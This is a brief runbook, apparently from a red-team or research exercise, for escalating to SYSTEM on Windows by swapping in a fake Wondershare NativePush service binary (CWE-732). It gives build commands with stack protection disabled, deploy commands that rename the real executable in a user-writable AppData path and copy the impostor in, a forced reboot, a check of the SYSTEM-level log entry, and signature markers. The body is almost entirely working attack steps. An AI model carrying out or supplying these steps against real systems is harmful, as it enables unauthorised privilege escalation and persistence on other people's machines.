# V4 DELTA — Service Binary Replacement (CWE-732)

## Build
```cmd
vcvars64.bat
cl.exe svc_replace_annotated.c /Fe:WsNativePushService.exe /O1 /GS- /utf-8 /link advapi32.lib user32.lib
```

## Deploy
```cmd
ren "C:\Users\apacw\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe" WsNativePushService_real.exe
copy WsNativePushService.exe "C:\Users\apacw\AppData\Local\Wondershare\Wondershare NativePush\"
shutdown /r /t 0
```

## Verify
```cmd
type C:\Windows\Temp\svc_health.log
```
Expected: `timestamp|SYSTEM|elev=1|pid=XXXX|DELTA_REPLACE`

## Signature Set: DELTA
- XOR Key: 0x52
- Canary: `C:\Windows\Temp\svc_health.log`
- Tag: `DELTA_REPLACE`
